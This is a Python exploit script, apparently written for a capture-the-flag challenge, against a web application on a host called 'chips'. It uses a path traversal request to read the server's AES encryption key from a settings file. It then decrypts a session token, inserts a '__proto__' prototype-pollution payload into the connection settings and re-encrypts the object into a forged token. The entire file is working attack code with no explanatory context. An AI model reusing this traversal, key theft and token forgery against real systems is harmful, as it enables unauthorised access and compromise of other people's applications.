import requests
import base64
import json
from Crypto import Random
from Crypto.Cipher import AES
from secrets import token_bytes
from pprint import pprint
from Crypto.Util.Padding import pad

def get_crypt_key():
	target = "http://chips/files/....//settings/clientOptions.json"
	r = requests.get(target)
	crypt = json.loads(r.text)['crypt']
	return crypt

def decrypt(s):
	a = base64.b64decode(s).decode()
	obj = json.loads(a)
	encoded_iv = obj['iv']
	encoded_value = obj['value']
	print(encoded_value)
	iv = base64.b64decode(encoded_iv)
	ciphertext = base64.b64decode(encoded_value)

	crypt = get_crypt_key()
	# Mode 2 for Cipher-Block Chaining AES_256_CBC
	# Ref: https://pycryptodome.readthedocs.io/en/latest/src/cipher/aes.html

	decipher = AES.new(crypt['key'].encode(), 2, iv)
	pltext = decipher.decrypt(ciphertext).decode()
	while pltext[-1] != '}': pltext = pltext[:-1] # Remove trailing characters behind a }
	obj = json.loads(pltext)

	return obj

def encrypt(obj):
	crypt = get_crypt_key()

	iv = token_bytes(16)
	cipher = AES.new(crypt['key'].encode(), 2, iv)

	pltext = json.dumps(obj)
	padded = pad(pltext.encode(), cipher.block_size)
	crypted = cipher.encrypt(padded)
	
	encoded_value = base64.b64encode(crypted).decode()
	encoded_iv = base64.b64encode(iv).decode()

	obj = {
		'iv': encoded_iv,
		'value': encoded_value
	}
	
	obj_string = json.dumps(obj)
	s = base64.b64encode(obj_string.encode()).decode()

	return s

if __name__ == '__main__':
	obj = decrypt("eyJpdiI6ImpDOHpHSi80YmwwZmRUTEVWUWFuc3c9PSIsInZhbHVlIjoiTURPRUh0c0F3Y211VThCUG1ldnhBa1B4Y2tpYnFtNkhFWno5bU9oaWZOdG1uaStuRFVGYUVwUHNya2NveGNJUTlKd0hXMDNPVmtGaEdMaHlvU29kUTJuaUVib1FvbFpwMnQrbk84ZE90eUVsSzJtNjVVN3lTWmpDWUpVSzVmTm5RUWFrckEyQjh0aXV3dnBUd2djUFZJVVpQWFZkRmpPOGN0RUxCTGZmbEFzK1k1OXJxWjZ0MHpyZ1p2UWhkSVA4c0toenAxalAveE54Q2ozOEZ2bjd2NTN6WnNRY2dGOHMwZjB3SGRVTFRwOXBCVkdmcVhRaGlNWFFGd1dYVU80RytrTjBtYXZDYzdwSXZtazNETGE4WXB2V3QzS01MQW5HQ1JoMFBtbDk3cmhpc3hZMzJ3S0VNM1JxWk9tSWZVcmtCdjVGRFhYZ1JHOU5CSmo4NzRSbWFSYUF2RlRCSmNmL2xML29aSUFHTXZLaWlBZXpFZHdOQU1Hdm9zRktBakN6eDR3L2ZRK29Ic0ttd1hVUFl1VDVjdU5pNlhuK3JHVm9jRVVPSWVQRFpDdFJqbXpDK2ZJRzdvTjNQSFZkalBCQitMUWx1WGNzMVd4QUJFd0hqbENOeUE9PSJ9==")

	print(obj)
	obj["connection"]["settings"]["__proto__"] = {
		"toString":"placeholder"
	}
	pprint(obj)

	s = encrypt(obj)
	print()
	print("Printing token...")
	print(s)